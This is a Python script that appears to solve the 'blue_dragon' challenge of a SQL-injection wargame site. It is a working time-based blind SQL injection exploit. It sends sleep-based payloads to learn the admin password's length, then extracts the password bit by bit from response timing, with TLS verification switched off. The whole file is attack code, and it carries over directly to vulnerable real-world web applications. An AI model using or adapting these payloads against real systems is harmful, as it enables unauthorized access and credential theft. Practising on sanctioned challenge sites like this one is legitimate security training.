import requests
import time

requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php'
headers = {'Cookie': ''}

P_Length = 0
pw = ''
for i in range(1, 50):
    start_time = time.time()
    payload = "?id=admin' and if(length(pw)={},sleep(2),1)%23".format(i)
    res = sess.get(url=URL + payload, headers=headers, verify=False)
    finish_time = time.time() - start_time
    if finish_time > 2:
        P_Length = i
        break
    else:
        pass
print('PLength = {}'.format(i))

for i in range(1, P_Length+1):
    bit=''
    for j in range(1, 9):
        start_time = time.time()
        payload = "?id=admin' and if(substr(lpad(bin(ord(substr(pw,{},1))),8,0),{},1)=1,sleep(2),1)%23".format(i,j)
        res = sess.get(url=URL + payload, headers=headers, verify=False)
        finish_time = time.time() - start_time
        #print(finish_time,'{}'.format(j))
        if finish_time > 2:
            bit+='1'
        else:
            bit+='0'
    pw += chr((int(bit, 2)))
    print('Password(count %02d) : %s (bit : %s)' % (i, chr(int(bit, 2)), bit))
print('Password= {}'.format(pw))
